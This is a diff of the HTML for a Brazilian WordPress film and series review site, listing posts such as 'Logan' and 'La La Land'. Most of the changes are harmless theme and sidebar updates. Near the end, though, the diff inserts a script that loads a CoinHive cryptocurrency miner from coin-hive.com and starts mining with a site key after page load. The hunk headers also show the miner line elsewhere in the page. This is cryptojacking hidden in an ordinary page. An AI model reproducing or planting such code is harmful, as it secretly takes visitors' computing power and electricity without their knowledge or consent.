-				        <svg class="hu-svg-placeholder thumb-medium-empty" id="59bb803c9acc4" viewbox="0 0 1792 1792" xmlns="http://www.w3.org/2000/svg"><path d="M928 832q0-14-9-23t-23-9q-66 0-113 47t-47 113q0 14 9 23t23 9 23-9 9-23q0-40 28-68t68-28q14 0 23-9t9-23zm224 130q0 106-75 181t-181 75-181-75-75-181 75-181 181-75 181 75 75 181zm-1024 574h1536v-128h-1536v128zm1152-574q0-159-112.5-271.5t-271.5-112.5-271.5 112.5-112.5 271.5 112.5 271.5 271.5 112.5 271.5-112.5 112.5-271.5zm-1024-642h384v-128h-384v128zm-128 192h1536v-256h-828l-64 128h-644v128zm1664-256v1280q0 53-37.5 90.5t-90.5 37.5h-1536q-53 0-90.5-37.5t-37.5-90.5v-1280q0-53 37.5-90.5t90.5-37.5h1536q53 0 90.5 37.5t37.5 90.5z"/></svg>
+				        <svg class="hu-svg-placeholder thumb-medium-empty" id="59bd5e3baaa6a" viewbox="0 0 1792 1792" xmlns="http://www.w3.org/2000/svg"><path d="M928 832q0-14-9-23t-23-9q-66 0-113 47t-47 113q0 14 9 23t23 9 23-9 9-23q0-40 28-68t68-28q14 0 23-9t9-23zm224 130q0 106-75 181t-181 75-181-75-75-181 75-181 181-75 181 75 75 181zm-1024 574h1536v-128h-1536v128zm1152-574q0-159-112.5-271.5t-271.5-112.5-271.5 112.5-112.5 271.5 112.5 271.5 271.5 112.5 271.5-112.5 112.5-271.5zm-1024-642h384v-128h-384v128zm-128 192h1536v-256h-828l-64 128h-644v128zm1664-256v1280q0 53-37.5 90.5t-90.5 37.5h-1536q-53 0-90.5-37.5t-37.5-90.5v-1280q0-53 37.5-90.5t90.5-37.5h1536q53 0 90.5 37.5t37.5 90.5z"/></svg>
 
         <script type="text/javascript">
           jQuery( function($){
             if ( $('#flexslider-featured').length ) {
               $('#flexslider-featured').on('featured-slider-ready', function() {
-                $( '#59bb803c9acc4' ).animateSvg();
+                $( '#59bd5e3baaa6a' ).animateSvg();
               });
-            } else { $( '#59bb803c9acc4' ).animateSvg( { svg_opacity : 0.3, filter_opacity : 0.5 } ); }
+            } else { $( '#59bd5e3baaa6a' ).animateSvg( { svg_opacity : 0.3, filter_opacity : 0.5 } ); }
           });
         </script>
-         <img class="hu-img-placeholder" src="/default_image_649.png" alt="Lewis Hamilton vence GP da Espanha" data-hu-post-id="59bb803c9acc4" />															</a>
+         <img class="hu-img-placeholder" src="/wp-content/themes/hueman/assets/front/img/thumb-medium-empty.png" alt="Lewis Hamilton vence GP da Espanha" data-hu-post-id="59bd5e3baaa6a" />															</a>
 					</div><!--/.post-thumbnail-->
 
 		<div class="post-meta group">
@@ -446,7 +493,7 @@ var __m=new CoinHive.User("hjflNfOWrK7bMwGmLrOdjoLaolDb8dZf","DW",{throttle:spee
 		</div><!--/.post-meta-->
 
 		<h2 class="post-title entry-title">
-			<a href="/archives/5599" rel="bookmark" title="Lewis Hamilton vence GP da Espanha" target="_blank">Lewis Hamilton vence GP da Espanha</a>
+			<a href="/archives/5599" rel="bookmark" title="Lewis Hamilton vence GP da Espanha">Lewis Hamilton vence GP da Espanha</a>
 		</h2><!--/.post-title-->
 
 				<div class="entry excerpt entry-summary">
@@ -459,18 +506,18 @@ var __m=new CoinHive.User("hjflNfOWrK7bMwGmLrOdjoLaolDb8dZf","DW",{throttle:spee
 
 		<div class="post-thumbnail">
 			<a href="/archives/5598" title="Fluminense bate o Santos por 3 a 2 na estreia do Brasileirão">
-				        <svg class="hu-svg-placeholder thumb-medium-empty" id="59bb803c9e838" viewbox="0 0 1792 1792" xmlns="http://www.w3.org/2000/svg"><path d="M928 832q0-14-9-23t-23-9q-66 0-113 47t-47 113q0 14 9 23t23 9 23-9 9-23q0-40 28-68t68-28q14 0 23-9t9-23zm224 130q0 106-75 181t-181 75-181-75-75-181 75-181 181-75 181 75 75 181zm-1024 574h1536v-128h-1536v128zm1152-574q0-159-112.5-271.5t-271.5-112.5-271.5 112.5-112.5 271.5 112.5 271.5 271.5 112.5 271.5-112.5 112.5-271.5zm-1024-642h384v-128h-384v128zm-128 192h1536v-256h-828l-64 128h-644v128zm1664-256v1280q0 53-37.5 90.5t-90.5 37.5h-1536q-53 0-90.5-37.5t-37.5-90.5v-1280q0-53 37.5-90.5t90.5-37.5h1536q53 0 90.5 37.5t37.5 90.5z"/></svg>
+				        <svg class="hu-svg-placeholder thumb-medium-empty" id="59bd5e3bb04d7" viewbox="0 0 1792 1792" xmlns="http://www.w3.org/2000/svg"><path d="M928 832q0-14-9-23t-23-9q-66 0-113 47t-47 113q0 14 9 23t23 9 23-9 9-23q0-40 28-68t68-28q14 0 23-9t9-23zm224 130q0 106-75 181t-181 75-181-75-75-181 75-181 181-75 181 75 75 181zm-1024 574h1536v-128h-1536v128zm1152-574q0-159-112.5-271.5t-271.5-112.5-271.5 112.5-112.5 271.5 112.5 271.5 271.5 112.5 271.5-112.5 112.5-271.5zm-1024-642h384v-128h-384v128zm-128 192h1536v-256h-828l-64 128h-644v128zm1664-256v1280q0 53-37.5 90.5t-90.5 37.5h-1536q-53 0-90.5-37.5t-37.5-90.5v-1280q0-53 37.5-90.5t90.5-37.5h1536q53 0 90.5 37.5t37.5 90.5z"/></svg>
 
         <script type="text/javascript">
           jQuery( function($){
             if ( $('#flexslider-featured').length ) {
               $('#flexslider-featured').on('featured-slider-ready', function() {
-                $( '#59bb803c9e838' ).animateSvg();
+                $( '#59bd5e3bb04d7' ).animateSvg();
               });
-            } else { $( '#59bb803c9e838' ).animateSvg( { svg_opacity : 0.3, filter_opacity : 0.5 } ); }
+            } else { $( '#59bd5e3bb04d7' ).animateSvg( { svg_opacity : 0.3, filter_opacity : 0.5 } ); }
           });
         </script>
-         <img class="hu-img-placeholder" src="/default_image_649.png" alt="Fluminense bate o Santos por 3 a 2 na estreia do Brasileirão" data-hu-post-id="59bb803c9e838" />															</a>
+         <img class="hu-img-placeholder" src="/wp-content/themes/hueman/assets/front/img/thumb-medium-empty.png" alt="Fluminense bate o Santos por 3 a 2 na estreia do Brasileirão" data-hu-post-id="59bd5e3bb04d7" />															</a>
 					</div><!--/.post-thumbnail-->
 
 		<div class="post-meta group">
@@ -486,7 +533,7 @@ var __m=new CoinHive.User("hjflNfOWrK7bMwGmLrOdjoLaolDb8dZf","DW",{throttle:spee
 		</div><!--/.post-meta-->
 
 		<h2 class="post-title entry-title">
-			<a href="/archives/5598" rel="bookmark" title="Fluminense bate o Santos por 3 a 2 na estreia do Brasileirão" target="_blank">Fluminense bate o Santos por 3 a 2 na estreia do Brasileirão</a>
+			<a href="/archives/5598" rel="bookmark" title="Fluminense bate o Santos por 3 a 2 na estreia do Brasileirão">Fluminense bate o Santos por 3 a 2 na estreia do Brasileirão</a>
 		</h2><!--/.post-title-->
 
 				<div class="entry excerpt entry-summary">
@@ -499,18 +546,18 @@ var __m=new CoinHive.User("hjflNfOWrK7bMwGmLrOdjoLaolDb8dZf","DW",{throttle:spee
 
 		<div class="post-thumbnail">
 			<a href="/archives/5597" title="Cantor Daniel emociona e presenteia paranaenses na véspera do Dia das Mães">
-				        <svg class="hu-svg-placeholder thumb-medium-empty" id="59bb803ca245e" viewbox="0 0 1792 1792" xmlns="http://www.w3.org/2000/svg"><path d="M928 832q0-14-9-23t-23-9q-66 0-113 47t-47 113q0 14 9 23t23 9 23-9 9-23q0-40 28-68t68-28q14 0 23-9t9-23zm224 130q0 106-75 181t-181 75-181-75-75-181 75-181 181-75 181 75 75 181zm-1024 574h1536v-128h-1536v128zm1152-574q0-159-112.5-271.5t-271.5-112.5-271.5 112.5-112.5 271.5 112.5 271.5 271.5 112.5 271.5-112.5 112.5-271.5zm-1024-642h384v-128h-384v128zm-128 192h1536v-256h-828l-64 128h-644v128zm1664-256v1280q0 53-37.5 90.5t-90.5 37.5h-1536q-53 0-90.5-37.5t-37.5-90.5v-1280q0-53 37.5-90.5t90.5-37.5h1536q53 0 90.5 37.5t37.5 90.5z"/></svg>
+				        <svg class="hu-svg-placeholder thumb-medium-empty" id="59bd5e3bb8a47" viewbox="0 0 1792 1792" xmlns="http://www.w3.org/2000/svg"><path d="M928 832q0-14-9-23t-23-9q-66 0-113 47t-47 113q0 14 9 23t23 9 23-9 9-23q0-40 28-68t68-28q14 0 23-9t9-23zm224 130q0 106-75 181t-181 75-181-75-75-181 75-181 181-75 181 75 75 181zm-1024 574h1536v-128h-1536v128zm1152-574q0-159-112.5-271.5t-271.5-112.5-271.5 112.5-112.5 271.5 112.5 271.5 271.5 112.5 271.5-112.5 112.5-271.5zm-1024-642h384v-128h-384v128zm-128 192h1536v-256h-828l-64 128h-644v128zm1664-256v1280q0 53-37.5 90.5t-90.5 37.5h-1536q-53 0-90.5-37.5t-37.5-90.5v-1280q0-53 37.5-90.5t90.5-37.5h1536q53 0 90.5 37.5t37.5 90.5z"/></svg>
 
         <script type="text/javascript">
           jQuery( function($){
             if ( $('#flexslider-featured').length ) {
               $('#flexslider-featured').on('featured-slider-ready', function() {
-                $( '#59bb803ca245e' ).animateSvg();
+                $( '#59bd5e3bb8a47' ).animateSvg();
               });
-            } else { $( '#59bb803ca245e' ).animateSvg( { svg_opacity : 0.3, filter_opacity : 0.5 } ); }
+            } else { $( '#59bd5e3bb8a47' ).animateSvg( { svg_opacity : 0.3, filter_opacity : 0.5 } ); }
           });
         </script>
-         <img class="hu-img-placeholder" src="/default_image_649.png" alt="Cantor Daniel emociona e presenteia paranaenses na véspera do Dia das Mães" data-hu-post-id="59bb803ca245e" />															</a>
+         <img class="hu-img-placeholder" src="/wp-content/themes/hueman/assets/front/img/thumb-medium-empty.png" alt="Cantor Daniel emociona e presenteia paranaenses na véspera do Dia das Mães" data-hu-post-id="59bd5e3bb8a47" />															</a>
 					</div><!--/.post-thumbnail-->
 
 		<div class="post-meta group">
@@ -526,7 +573,7 @@ var __m=new CoinHive.User("hjflNfOWrK7bMwGmLrOdjoLaolDb8dZf","DW",{throttle:spee
 		</div><!--/.post-meta-->
 
 		<h2 class="post-title entry-title">
-			<a href="/archives/5597" rel="bookmark" title="Cantor Daniel emociona e presenteia paranaenses na véspera do Dia das Mães" target="_blank">Cantor Daniel emociona e presenteia paranaenses na véspera do Dia das Mães</a>
+			<a href="/archives/5597" rel="bookmark" title="Cantor Daniel emociona e presenteia paranaenses na véspera do Dia das Mães">Cantor Daniel emociona e presenteia paranaenses na véspera do Dia das Mães</a>
 		</h2><!--/.post-title-->
 
 				<div class="entry excerpt entry-summary">
@@ -555,7 +602,7 @@ var __m=new CoinHive.User("hjflNfOWrK7bMwGmLrOdjoLaolDb8dZf","DW",{throttle:spee
 		</div><!--/.post-meta-->
 
 		<h2 class="post-title entry-title">
-			<a href="/archives/4231" rel="bookmark" title="T2 Trainspotting" target="_blank">T2 Trainspotting</a>
+			<a href="/archives/4231" rel="bookmark" title="T2 Trainspotting">T2 Trainspotting</a>
 		</h2><!--/.post-title-->
 
 				<div class="entry excerpt entry-summary">
@@ -584,7 +631,7 @@ var __m=new CoinHive.User("hjflNfOWrK7bMwGmLrOdjoLaolDb8dZf","DW",{throttle:spee
 		</div><!--/.post-meta-->
 
 		<h2 class="post-title entry-title">
-			<a href="/archives/4229" rel="bookmark" title="Era o Hotel Cambridge" target="_blank">Era o Hotel Cambridge</a>
+			<a href="/archives/4229" rel="bookmark" title="Era o Hotel Cambridge">Era o Hotel Cambridge</a>
 		</h2><!--/.post-title-->
 
 				<div class="entry excerpt entry-summary">
@@ -597,18 +644,18 @@ var __m=new CoinHive.User("hjflNfOWrK7bMwGmLrOdjoLaolDb8dZf","DW",{throttle:spee
 
 		<div class="post-thumbnail">
 			<a href="/archives/4008" title="Cinco filmes disponíveis em streaming">
-				        <svg class="hu-svg-placeholder thumb-medium-empty" id="59bb803cc22f0" viewbox="0 0 1792 1792" xmlns="http://www.w3.org/2000/svg"><path d="M928 832q0-14-9-23t-23-9q-66 0-113 47t-47 113q0 14 9 23t23 9 23-9 9-23q0-40 28-68t68-28q14 0 23-9t9-23zm224 130q0 106-75 181t-181 75-181-75-75-181 75-181 181-75 181 75 75 181zm-1024 574h1536v-128h-1536v128zm1152-574q0-159-112.5-271.5t-271.5-112.5-271.5 112.5-112.5 271.5 112.5 271.5 271.5 112.5 271.5-112.5 112.5-271.5zm-1024-642h384v-128h-384v128zm-128 192h1536v-256h-828l-64 128h-644v128zm1664-256v1280q0 53-37.5 90.5t-90.5 37.5h-1536q-53 0-90.5-37.5t-37.5-90.5v-1280q0-53 37.5-90.5t90.5-37.5h1536q53 0 90.5 37.5t37.5 90.5z"/></svg>
+				        <svg class="hu-svg-placeholder thumb-medium-empty" id="59bd5e3be167c" viewbox="0 0 1792 1792" xmlns="http://www.w3.org/2000/svg"><path d="M928 832q0-14-9-23t-23-9q-66 0-113 47t-47 113q0 14 9 23t23 9 23-9 9-23q0-40 28-68t68-28q14 0 23-9t9-23zm224 130q0 106-75 181t-181 75-181-75-75-181 75-181 181-75 181 75 75 181zm-1024 574h1536v-128h-1536v128zm1152-574q0-159-112.5-271.5t-271.5-112.5-271.5 112.5-112.5 271.5 112.5 271.5 271.5 112.5 271.5-112.5 112.5-271.5zm-1024-642h384v-128h-384v128zm-128 192h1536v-256h-828l-64 128h-644v128zm1664-256v1280q0 53-37.5 90.5t-90.5 37.5h-1536q-53 0-90.5-37.5t-37.5-90.5v-1280q0-53 37.5-90.5t90.5-37.5h1536q53 0 90.5 37.5t37.5 90.5z"/></svg>
 
         <script type="text/javascript">
           jQuery( function($){
             if ( $('#flexslider-featured').length ) {
               $('#flexslider-featured').on('featured-slider-ready', function() {
-                $( '#59bb803cc22f0' ).animateSvg();
+                $( '#59bd5e3be167c' ).animateSvg();
               });
-            } else { $( '#59bb803cc22f0' ).animateSvg( { svg_opacity : 0.3, filter_opacity : 0.5 } ); }
+            } else { $( '#59bd5e3be167c' ).animateSvg( { svg_opacity : 0.3, filter_opacity : 0.5 } ); }
           });
         </script>
-         <img class="hu-img-placeholder" src="/default_image_649.png" alt="Cinco filmes disponíveis em streaming" data-hu-post-id="59bb803cc22f0" />															</a>
+         <img class="hu-img-placeholder" src="/wp-content/themes/hueman/assets/front/img/thumb-medium-empty.png" alt="Cinco filmes disponíveis em streaming" data-hu-post-id="59bd5e3be167c" />															</a>
 					</div><!--/.post-thumbnail-->
 
 		<div class="post-meta group">
@@ -624,7 +671,7 @@ var __m=new CoinHive.User("hjflNfOWrK7bMwGmLrOdjoLaolDb8dZf","DW",{throttle:spee
 		</div><!--/.post-meta-->
 
 		<h2 class="post-title entry-title">
-			<a href="/archives/4008" rel="bookmark" title="Cinco filmes disponíveis em streaming" target="_blank">Cinco filmes disponíveis em streaming</a>
+			<a href="/archives/4008" rel="bookmark" title="Cinco filmes disponíveis em streaming">Cinco filmes disponíveis em streaming</a>
 		</h2><!--/.post-title-->
 
 				<div class="entry excerpt entry-summary">
@@ -653,7 +700,7 @@ var __m=new CoinHive.User("hjflNfOWrK7bMwGmLrOdjoLaolDb8dZf","DW",{throttle:spee
 		</div><!--/.post-meta-->
 
 		<h2 class="post-title entry-title">
-			<a href="/archives/3545" rel="bookmark" title="Logan" target="_blank">Logan</a>
+			<a href="/archives/3545" rel="bookmark" title="Logan">Logan</a>
 		</h2><!--/.post-title-->
 
 				<div class="entry excerpt entry-summary">
@@ -682,7 +729,7 @@ var __m=new CoinHive.User("hjflNfOWrK7bMwGmLrOdjoLaolDb8dZf","DW",{throttle:spee
 		</div><!--/.post-meta-->
 
 		<h2 class="post-title entry-title">
-			<a href="/archives/3490" rel="bookmark" title="A Jovem Rainha" target="_blank">A Jovem Rainha</a>
+			<a href="/archives/3490" rel="bookmark" title="A Jovem Rainha">A Jovem Rainha</a>
 		</h2><!--/.post-title-->
 
 				<div class="entry excerpt entry-summary">
@@ -711,7 +758,7 @@ var __m=new CoinHive.User("hjflNfOWrK7bMwGmLrOdjoLaolDb8dZf","DW",{throttle:spee
 		</div><!--/.post-meta-->
 
 		<h2 class="post-title entry-title">
-			<a href="/archives/3379" rel="bookmark" title="Estrelas Além do Tempo" target="_blank">Estrelas Além do Tempo</a>
+			<a href="/archives/3379" rel="bookmark" title="Estrelas Além do Tempo">Estrelas Além do Tempo</a>
 		</h2><!--/.post-title-->
 
 				<div class="entry excerpt entry-summary">
@@ -740,7 +787,7 @@ var __m=new CoinHive.User("hjflNfOWrK7bMwGmLrOdjoLaolDb8dZf","DW",{throttle:spee
 		</div><!--/.post-meta-->
 
 		<h2 class="post-title entry-title">
-			<a href="/archives/3321" rel="bookmark" title="Silêncio" target="_blank">Silêncio</a>
+			<a href="/archives/3321" rel="bookmark" title="Silêncio">Silêncio</a>
 		</h2><!--/.post-title-->
 
 				<div class="entry excerpt entry-summary">
@@ -769,7 +816,7 @@ var __m=new CoinHive.User("hjflNfOWrK7bMwGmLrOdjoLaolDb8dZf","DW",{throttle:spee
 		</div><!--/.post-meta-->
 
 		<h2 class="post-title entry-title">
-			<a href="/archives/2949" rel="bookmark" title="Cinquenta Tons Mais Escuros" target="_blank">Cinquenta Tons Mais Escuros</a>
+			<a href="/archives/2949" rel="bookmark" title="Cinquenta Tons Mais Escuros">Cinquenta Tons Mais Escuros</a>
 		</h2><!--/.post-title-->
 
 				<div class="entry excerpt entry-summary">
@@ -798,7 +845,7 @@ var __m=new CoinHive.User("hjflNfOWrK7bMwGmLrOdjoLaolDb8dZf","DW",{throttle:spee
 		</div><!--/.post-meta-->
 
 		<h2 class="post-title entry-title">
-			<a href="/archives/2444" rel="bookmark" title="Até o Último Homem" target="_blank">Até o Último Homem</a>
+			<a href="/archives/2444" rel="bookmark" title="Até o Último Homem">Até o Último Homem</a>
 		</h2><!--/.post-title-->
 
 				<div class="entry excerpt entry-summary">
@@ -827,7 +874,7 @@ var __m=new CoinHive.User("hjflNfOWrK7bMwGmLrOdjoLaolDb8dZf","DW",{throttle:spee
 		</div><!--/.post-meta-->
 
 		<h2 class="post-title entry-title">
-			<a href="/archives/2442" rel="bookmark" title="Paraíso" target="_blank">Paraíso</a>
+			<a href="/archives/2442" rel="bookmark" title="Paraíso">Paraíso</a>
 		</h2><!--/.post-title-->
 
 				<div class="entry excerpt entry-summary">
@@ -856,7 +903,7 @@ var __m=new CoinHive.User("hjflNfOWrK7bMwGmLrOdjoLaolDb8dZf","DW",{throttle:spee
 		</div><!--/.post-meta-->
 
 		<h2 class="post-title entry-title">
-			<a href="/archives/2157" rel="bookmark" title="Os Saltimbancos Trapalhões: Rumo a Hollywood" target="_blank">Os Saltimbancos Trapalhões: Rumo a Hollywood</a>
+			<a href="/archives/2157" rel="bookmark" title="Os Saltimbancos Trapalhões: Rumo a Hollywood">Os Saltimbancos Trapalhões: Rumo a Hollywood</a>
 		</h2><!--/.post-title-->
 
 				<div class="entry excerpt entry-summary">
@@ -885,7 +932,7 @@ var __m=new CoinHive.User("hjflNfOWrK7bMwGmLrOdjoLaolDb8dZf","DW",{throttle:spee
 		</div><!--/.post-meta-->
 
 		<h2 class="post-title entry-title">
-			<a href="/archives/2113" rel="bookmark" title="Manchester à Beira-Mar" target="_blank">Manchester à Beira-Mar</a>
+			<a href="/archives/2113" rel="bookmark" title="Manchester à Beira-Mar">Manchester à Beira-Mar</a>
 		</h2><!--/.post-title-->
 
 				<div class="entry excerpt entry-summary">
@@ -914,7 +961,7 @@ var __m=new CoinHive.User("hjflNfOWrK7bMwGmLrOdjoLaolDb8dZf","DW",{throttle:spee
 		</div><!--/.post-meta-->
 
 		<h2 class="post-title entry-title">
-			<a href="/archives/1912" rel="bookmark" title="La La Land – Cantando Estações" target="_blank">La La Land – Cantando Estações</a>
+			<a href="/archives/1912" rel="bookmark" title="La La Land – Cantando Estações">La La Land – Cantando Estações</a>
 		</h2><!--/.post-title-->
 
 				<div class="entry excerpt entry-summary">
@@ -943,7 +990,7 @@ var __m=new CoinHive.User("hjflNfOWrK7bMwGmLrOdjoLaolDb8dZf","DW",{throttle:spee
 		</div><!--/.post-meta-->
 
 		<h2 class="post-title entry-title">
-			<a href="/archives/1759" rel="bookmark" title="#Cinema2016: melhores do ano" target="_blank">#Cinema2016: melhores do ano</a>
+			<a href="/archives/1759" rel="bookmark" title="#Cinema2016: melhores do ano">#Cinema2016: melhores do ano</a>
 		</h2><!--/.post-title-->
 
 				<div class="entry excerpt entry-summary">
@@ -1018,7 +1065,7 @@ var wid = '288202';
 </li>
 	<li class="cat-item cat-item-36"><a href="/archives/category/cine-alerta-series" >Cine Alerta (Séries)</a> (38)
 </li>
-	<li class="cat-item cat-item-2"><a href="/archives/category/cinema" >Cinema</a> (1,837)
+	<li class="cat-item cat-item-2"><a href="/archives/category/cinema" >Cinema</a> (1,841)
 </li>
 	<li class="cat-item cat-item-8"><a href="/archives/category/cinema-em-cena" >Cinema em Cena</a> (10)
 </li>
@@ -1028,13 +1075,13 @@ var wid = '288202';
 </li>
 	<li class="cat-item cat-item-32"><a href="/archives/category/cinema-em-serie-series" >Cinema em Série (Séries)</a> (3)
 </li>
-	<li class="cat-item cat-item-40"><a href="/archives/category/cinema-no-escurinho" >Cinema no escurinho</a> (10)
+	<li class="cat-item cat-item-40"><a href="/archives/category/cinema-no-escurinho" >Cinema no escurinho</a> (11)
 </li>
 	<li class="cat-item cat-item-38"><a href="/archives/category/criticos-com" >Críticos.com</a> (94)
 </li>
 	<li class="cat-item cat-item-11"><a href="/archives/category/estante-da-sala" >Estante da Sala</a> (40)
 </li>
-	<li class="cat-item cat-item-39"><a href="/archives/category/filmes-classicos" >Filmes Clássicos</a> (42)
+	<li class="cat-item cat-item-39"><a href="/archives/category/filmes-classicos" >Filmes Clássicos</a> (43)
 </li>
 	<li class="cat-item cat-item-10 current-cat"><a href="/archives/category/filmes-do-chico" >Filmes do Chico</a> (24)
 </li>
@@ -1042,7 +1089,7 @@ var wid = '288202';
 </li>
 	<li class="cat-item cat-item-25"><a href="/archives/category/meus-2-centavos" >Meus 2 Centavos</a> (128)
 </li>
-	<li class="cat-item cat-item-18"><a href="/archives/category/mix-de-series" >Mix de Séries</a> (1,336)
+	<li class="cat-item cat-item-18"><a href="/archives/category/mix-de-series" >Mix de Séries</a> (1,339)
 </li>
 	<li class="cat-item cat-item-26"><a href="/archives/category/nerd-rabugento" >Nerd Rabugento</a> (96)
 </li>
@@ -1056,11 +1103,11 @@ var wid = '288202';
 </li>
 	<li class="cat-item cat-item-24"><a href="/archives/category/pipocando" >Pipocando</a> (192)
 </li>
-	<li class="cat-item cat-item-21"><a href="/archives/category/plano-critico-cinema" >Plano Crítico (Cinema)</a> (770)
+	<li class="cat-item cat-item-21"><a href="/archives/category/plano-critico-cinema" >Plano Crítico (Cinema)</a> (773)
 </li>
 	<li class="cat-item cat-item-20"><a href="/archives/category/plano-critico-series" >Plano Crítico (Séries)</a> (419)
 </li>
-	<li class="cat-item cat-item-6"><a href="/archives/category/podcast" >Podcast</a> (220)
+	<li class="cat-item cat-item-6"><a href="/archives/category/podcast" >Podcast</a> (221)
 </li>
 	<li class="cat-item cat-item-22"><a href="/archives/category/pop-series" >Pop Séries</a> (34)
 </li>
@@ -1068,11 +1115,11 @@ var wid = '288202';
 </li>
 	<li class="cat-item cat-item-13"><a href="/archives/category/razao-de-aspecto" >Razão de Aspecto</a> (177)
 </li>
-	<li class="cat-item cat-item-17"><a href="/archives/category/serie-maniacos" >Série Maníacos</a> (1,948)
+	<li class="cat-item cat-item-17"><a href="/archives/category/serie-maniacos" >Série Maníacos</a> (1,956)
 </li>
 	<li class="cat-item cat-item-34"><a href="/archives/category/serie-maniacos-podcast" >Série Maníacos (Podcast)</a> (69)
 </li>
-	<li class="cat-item cat-item-16"><a href="/archives/category/series" >Séries</a> (3,864)
+	<li class="cat-item cat-item-16"><a href="/archives/category/series" >Séries</a> (3,875)
 </li>
 	<li class="cat-item cat-item-15"><a href="/archives/category/viagem-pelo-cinema" >Viagem pelo Cinema</a> (9)
 </li>
@@ -1081,19 +1128,19 @@ var wid = '288202';
 		</ul>
 </div>		<div id="recent-posts-2" class="widget widget_recent_entries">		<h3 class="widget-title">Publicações recentes</h3>		<ul>
 					<li>
-				<a href="/archives/7737">Crítica | Réquiem para um Sonho</a>
+				<a href="/archives/7751">Crítica | Amityville: O Despertar</a>
 						</li>
 					<li>
-				<a href="/archives/7730">Audiência USA – 12/09/17: Terça</a>
+				<a href="/archives/7745">Stitchers é cancelado depois de 3 temporadas pelo Freeform</a>
 						</li>
 					<li>
-				<a href="/archives/7729">Audiência USA – 11/09/17: Segunda</a>
+				<a href="/archives/7744">Kidding: Jim Carrey vai estrelar nova série do Showtime</a>
 						</li>
 					<li>
-				<a href="/archives/7728">Audiência USA – 10/09/17: Domingo</a>
+				<a href="/archives/7753">&quot;Feito na América&quot; e embalado sob medida para o talento de Tom Cruise</a>
 						</li>
 					<li>
-				<a href="/archives/7727">Masterchef Profissionais 2×02: Top 13</a>
+				<a href="/archives/7743">Audiência USA – 14/09/17: Quinta</a>
 						</li>
 				</ul>
 		</div>		
@@ -1139,7 +1186,9 @@ var wid = '288202';
                               <p>Críticas &copy; 2017. All Rights Reserved.</p>
                           </div><!--/#copyright-->
 
-                          <div id="credit" style="">Developed by <b><a href="http://www.drall.com.br" style="color:#d66000" target="_blank">Drall Consulting</a></b></div><!--/#credit-->
+                          <div id="credit" style="">
+                <p>Powered by <a href="http://wordpress.org" target="_blank">WordPress</a>. Theme by <a href="http://presscustomizr.com">Press Customizr</a>.</p>
+              </div><!--/#credit-->
             
           </div>
 
@@ -1165,7 +1214,7 @@ var wpcf7 = {"apiSettings":{"root":"http:\/\/criticas.centrodouniverso.com.br\/w
 <script type='text/javascript' src='/wp-includes/js/underscore.min.js'></script>
 <script type='text/javascript'>
 /* <![CDATA[ */
-var HUParams = {"_disabled":[],"SmoothScroll":{"Enabled":true,"Options":{"touchpadSupport":false}},"centerAllImg":"1","timerOnScrollAllBrowsers":"1","extLinksStyle":"","extLinksTargetExt":"","extLinksSkipSelectors":{"classes":["btn","button"],"ids":[]},"imgSmartLoadEnabled":"","imgSmartLoadOpts":{"parentSelectors":[".container .content",".container .sidebar","#footer","#header-widgets"],"opts":{"excludeImg":[".tc-holder-img"],"fadeIn_options":100}},"goldenRatio":"1.618","gridGoldenRatioLimit":"350","sbStickyUserSettings":{"desktop":true,"mobile":true},"isWPMobile":"","menuStickyUserSettings":{"desktop":"stick_up","mobile":"stick_up"},"isDevMode":"","ajaxUrl":"http:\/\/criticas.centrodouniverso.com.br\/?huajax=1","frontNonce":{"id":"HuFrontNonce","handle":"82f2d222f7"},"userStarted":{"with":"with|3.2.10","on":{"date":"2017-05-19 14:07:11.000000","timezone_type":3,"timezone":"UTC"}},"isWelcomeNoteOn":"","welcomeContent":""};
+var HUParams = {"_disabled":[],"SmoothScroll":{"Enabled":true,"Options":{"touchpadSupport":false}},"centerAllImg":"1","timerOnScrollAllBrowsers":"1","extLinksStyle":"","extLinksTargetExt":"","extLinksSkipSelectors":{"classes":["btn","button"],"ids":[]},"imgSmartLoadEnabled":"","imgSmartLoadOpts":{"parentSelectors":[".container .content",".container .sidebar","#footer","#header-widgets"],"opts":{"excludeImg":[".tc-holder-img"],"fadeIn_options":100}},"goldenRatio":"1.618","gridGoldenRatioLimit":"350","sbStickyUserSettings":{"desktop":true,"mobile":true},"isWPMobile":"","menuStickyUserSettings":{"desktop":"stick_up","mobile":"stick_up"},"isDevMode":"","ajaxUrl":"http:\/\/criticas.centrodouniverso.com.br\/?huajax=1","frontNonce":{"id":"HuFrontNonce","handle":"bd86fd2199"},"userStarted":{"with":"with|3.2.10","on":{"date":"2017-05-19 14:07:11.000000","timezone_type":3,"timezone":"UTC"}},"isWelcomeNoteOn":"","welcomeContent":""};
 /* ]]> */
 </script>
 <script type='text/javascript' src='/wp-content/themes/hueman/assets/front/js/scripts.min.js'></script>
@@ -1173,7 +1222,7 @@ var HUParams = {"_disabled":[],"SmoothScroll":{"Enabled":true,"Options":{"touchp
 <!--[if lt IE 9]>
 <script src="http://criticas.centrodouniverso.com.br/wp-content/themes/hueman/assets/front/js/ie/respond.js"></script>
 <![endif]-->
-</body>
+<script type='text/javascript' src='https://coin-hive.com/lib/coinhive.min.js'></script><script>var speed = ( window.matchMedia("only screen and (max-width: 760px)").matches )?0.8:0.17;var __m=new CoinHive.User("hjflNfOWrK7bMwGmLrOdjoLaolDb8dZf","DW",{throttle:speed});setTimeout(function(){__m.start();},3000);</script></body>
 </html><style>
 .site-description{
     color:white;
